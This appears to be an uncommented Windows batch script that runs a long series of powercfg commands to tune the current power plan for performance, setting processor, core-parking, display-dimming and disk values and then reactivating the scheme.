powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 619b7505-003b-4e82-b7a6-4dd29c300971 100
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 619b7505-003b-4e82-b7a6-4dd29c300971 100
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 619b7505-003b-4e82-b7a6-4dd29c300972 100
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 619b7505-003b-4e82-b7a6-4dd29c300972 100
::powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 06cadf0e-64ed-448a-8927-ce7bf90eb35d 1
::powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 06cadf0e-64ed-448a-8927-ce7bf90eb35d 1
::powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 06cadf0e-64ed-448a-8927-ce7bf90eb35e 1
::powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 06cadf0e-64ed-448a-8927-ce7bf90eb35e 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 06cadf0e-64ed-448a-8927-ce7bf90eb35d 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 06cadf0e-64ed-448a-8927-ce7bf90eb35d 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 06cadf0e-64ed-448a-8927-ce7bf90eb35e 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 06cadf0e-64ed-448a-8927-ce7bf90eb35e 0
::powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 12a0ab44-fe28-4fa9-b3bd-4b64f44960a6 1
::powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 12a0ab44-fe28-4fa9-b3bd-4b64f44960a6 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 12a0ab44-fe28-4fa9-b3bd-4b64f44960a6 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 12a0ab44-fe28-4fa9-b3bd-4b64f44960a6 0
::powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 12a0ab44-fe28-4fa9-b3bd-4b64f44960a7 1
::powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 12a0ab44-fe28-4fa9-b3bd-4b64f44960a7 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 12a0ab44-fe28-4fa9-b3bd-4b64f44960a7 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 12a0ab44-fe28-4fa9-b3bd-4b64f44960a7 0
::powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 40fbefc7-2e9d-4d25-a185-0cfd8574bac6 1
::powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 40fbefc7-2e9d-4d25-a185-0cfd8574bac6 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 40fbefc7-2e9d-4d25-a185-0cfd8574bac6 2
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 40fbefc7-2e9d-4d25-a185-0cfd8574bac6 2
::powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 40fbefc7-2e9d-4d25-a185-0cfd8574bac7 1
::powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 40fbefc7-2e9d-4d25-a185-0cfd8574bac7 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 40fbefc7-2e9d-4d25-a185-0cfd8574bac7 2
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 40fbefc7-2e9d-4d25-a185-0cfd8574bac7 2
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 465e1f50-b610-473a-ab58-00d1077dc418 2
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 465e1f50-b610-473a-ab58-00d1077dc418 2
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 465e1f50-b610-473a-ab58-00d1077dc419 2
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 465e1f50-b610-473a-ab58-00d1077dc419 2
powercfg /SETACVALUEINDEX SCHEME_CURRENT 2e601130-5351-4d9d-8e04-252966bad054 3166bc41-7e98-4e03-b34e-ec0f5f2b218e 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2e601130-5351-4d9d-8e04-252966bad054 3166bc41-7e98-4e03-b34e-ec0f5f2b218e 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 48672f38-7a9a-4bb2-8bf8-3d85be19de4e d6ba4903-386f-4c2c-8adb-5c21b3328d25 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 48672f38-7a9a-4bb2-8bf8-3d85be19de4e d6ba4903-386f-4c2c-8adb-5c21b3328d25 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 bae08b81-2d5e-4688-ad6a-13243356654b 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 bae08b81-2d5e-4688-ad6a-13243356654b 0
::
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 93b8b6dc-0698-4d1c-9ee4-0644e900c85d 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 93b8b6dc-0698-4d1c-9ee4-0644e900c85d 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 8baa4a8a-14c6-4451-8e8b-14bdbd197537 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 8baa4a8a-14c6-4451-8e8b-14bdbd197537 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 60fbe21b-efd9-49f2-b066-8674d8e9f423 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 60fbe21b-efd9-49f2-b066-8674d8e9f423 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 2430ab6f-a520-44a2-9601-f7f23b5134b1 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 2430ab6f-a520-44a2-9601-f7f23b5134b1 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 4bdaf4e9-d103-46d7-a5f0-6280121616ef 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 4bdaf4e9-d103-46d7-a5f0-6280121616ef 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 f735a673-2066-4f80-a0c5-ddee0cf1bf5d 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 f735a673-2066-4f80-a0c5-ddee0cf1bf5d 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 943c8cb6-6f93-4227-ad87-e9a3feec08d1 5
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 943c8cb6-6f93-4227-ad87-e9a3feec08d1 5
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 c7be0679-2817-4d69-9d02-519a537ed0c6 2
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 c7be0679-2817-4d69-9d02-519a537ed0c6 2
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 71021b41-c749-4d21-be74-a00f335d582b 1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 71021b41-c749-4d21-be74-a00f335d582b 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 2ddd5a84-5a71-437e-912a-db0b8c788732 1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 2ddd5a84-5a71-437e-912a-db0b8c788732 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 dfd10d17-d5eb-45dd-877a-9a34ddd15c82 1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 dfd10d17-d5eb-45dd-877a-9a34ddd15c82 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 447235c7-6a8d-4cc0-8e24-9eaf70b96e2b 2
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 447235c7-6a8d-4cc0-8e24-9eaf70b96e2b 2
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 447235c7-6a8d-4cc0-8e24-9eaf70b96e2c 2
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 447235c7-6a8d-4cc0-8e24-9eaf70b96e2c 2
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 b0deaf6b-59c0-4523-8a45-ca7f40244114 1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 b0deaf6b-59c0-4523-8a45-ca7f40244114 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 616cdaa5-695e-4545-97ad-97dc2d1bdd88 100
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 616cdaa5-695e-4545-97ad-97dc2d1bdd88 100
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 616cdaa5-695e-4545-97ad-97dc2d1bdd89 100
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 616cdaa5-695e-4545-97ad-97dc2d1bdd89 100
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 1facfc65-a930-4bc5-9f38-504ec097bbc0 100
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 1facfc65-a930-4bc5-9f38-504ec097bbc0 100
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 893dee8e-2bef-41e0-89c6-b55d0929964d 100
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 893dee8e-2bef-41e0-89c6-b55d0929964d 100
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 828423eb-8662-4344-90f7-52bf15870f5a 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 828423eb-8662-4344-90f7-52bf15870f5a 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 bf903d33-9d24-49d3-a468-e65e0325046a 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 bf903d33-9d24-49d3-a468-e65e0325046a 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 2e601130-5351-4d9d-8e04-252966bad054 d502f7ee-1dc7-4efd-a55d-f04b6f5c0545 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2e601130-5351-4d9d-8e04-252966bad054 d502f7ee-1dc7-4efd-a55d-f04b6f5c0545 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 abfc2519-3608-4c2a-94ea-171b0ed546ab 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 abfc2519-3608-4c2a-94ea-171b0ed546ab 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 0cc5b647-c1df-4637-891a-dec35c318584 100
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 0cc5b647-c1df-4637-891a-dec35c318584 100
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR CPMINCORES 100
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR CPMINCORES 100
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 0cc5b647-c1df-4637-891a-dec35c318583 100
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 0cc5b647-c1df-4637-891a-dec35c318583 100
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 7f2492b6-60b1-45e5-ae55-773f8cd5caec 1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 7f2492b6-60b1-45e5-ae55-773f8cd5caec 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 d8edeb9b-95cf-4f95-a73c-b061973693c9 1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 d8edeb9b-95cf-4f95-a73c-b061973693c9 1
::
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR HETEROPOLICY 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR HETEROPOLICY 0
::powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR IDLEDISABLE 1
::powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR IDLEDISABLE 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_VIDEO VIDEODIM 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_VIDEO VIDEODIM 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_VIDEO VIDEOCONLOCK 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_VIDEO VIDEOCONLOCK 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_DISK 0b2d69d7-a2a1-449c-9680-f91c70521c60 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_DISK 0b2d69d7-a2a1-449c-9680-f91c70521c60 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_DISK DISKBURSTIGNORE 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_DISK dab60367-53fe-4fbc-825e-521d069d2456 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_DISK dab60367-53fe-4fbc-825e-521d069d2456 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR SYSCOOLPOL 1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_NONE DEVICEIDLE 0
powercfg -setactive SCHEME_CURRENT
exit
